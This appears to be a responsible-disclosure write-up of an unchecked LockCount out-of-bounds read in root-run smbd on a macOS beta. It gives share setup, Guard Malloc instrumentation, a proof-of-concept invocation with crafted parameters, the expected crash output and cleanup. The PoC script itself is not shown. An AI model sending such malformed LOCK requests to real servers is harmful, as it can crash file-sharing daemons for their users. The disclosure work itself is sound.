# smbd SMB2 LOCK unchecked LockCount remote root OOB read

## Summary

On macOS 27 beta `26A5378n`, the SMB2 `LOCK` request extractor validates only
the 24-byte fixed request prefix. It accepts the attacker-controlled u16
`LockCount` without verifying that the frame also contains
`LockCount * 24` bytes of lock elements. `smb2_dispatch_lock` then walks that
many elements directly from the request pointer.

The included reproducer sends a valid file ID, `LockCount=65535`, and only 682
lock elements. Each supplied element is an unlock entry, which keeps the
handler's preflight classification homogeneous until it reaches the first
omitted element. Apple's Guard Malloc places the request allocation at a guard
boundary, producing a native root-`smbd` crash exactly on that first omitted
element.

## Impact boundary

- Process: `/usr/sbin/smbd`, running as root.
- Trigger: remote SMB2 `LOCK` request after obtaining a valid file handle.
- Demonstrated access: passwordless guest session after an administrator
  enables global SMB guest access and guest write access on a share.
- General access: any SMB account allowed to open a file on a writable share.
- Primitive: attacker-counted linear OOB read from the request allocation.
- Demonstrated impact: remote root-daemon denial of service under Apple's
  Guard Malloc with a native `.ips` report.
- Stock allocator: the same bounded request returned `STATUS_INVALID_PARAMETER`
  and the daemon remained alive on the observed layout; no stock crash,
  disclosure, or code execution is claimed.

## Reproduction

Requirements: macOS 27 beta `26A5378n` test VM, File Sharing enabled, SIP
disabled for test instrumentation, Python 3, and `impacket==0.13.1`.

Create a disposable guest share:

```sh
sudo sysadminctl -smbGuestAccess on
sudo mkdir -p /Users/Shared/smbtest
sudo chmod 0777 /Users/Shared/smbtest
sudo sharing -a /Users/Shared/smbtest -S smbtest -s 001 -g 001
```

Apply Guard Malloc to the next `smbd` launch, then stop the current daemon:

```sh
sudo launchctl debug system/com.apple.smbd \
  --guard-malloc --malloc-stack-logging \
  --stdout /tmp/smbd_lock_gm.out --stderr /tmp/smbd_lock_gm.err
sudo pkill -TERM -x smbd
```

Run the PoC:

```sh
python3 -m pip install impacket==0.13.1
python3 smbd_lock_count_oob.py \
  --host VM_ADDRESS --share smbtest \
  --count 0xffff --pad-size 0x3ff0 --pad-flags 4
```

Expected client result:

```text
connected ... lock_count=0xffff supplied_elements=682 pad_flags=0x4 request_size=0x4008
LOCK result: NetBIOSError: Error while reading from remote
```

Expected server result: root `smbd` exits and writes a report under
`/Library/Logs/DiagnosticReports/`. The included report is
`smbd-2026-07-21-191318-guardmalloc-lock-count.ips`.

Restore the VM after testing:

```sh
sudo sharing -r smbtest
sudo sysadminctl -smbGuestAccess off
sudo rm -rf /Users/Shared/smbtest
```

## Included files

- `smbd_lock_count_oob.py`: raw SMB2 `LOCK` reproducer.
- `smbd-2026-07-21-191318-guardmalloc-lock-count.ips`: native crash report.
- `stock_result.txt`: bounded stock-allocator replay and health result.
- `TECHNICAL_ANALYSIS.md`: instruction-level bounds and fault geometry.
- `SHA256SUMS.txt`: package checksums.
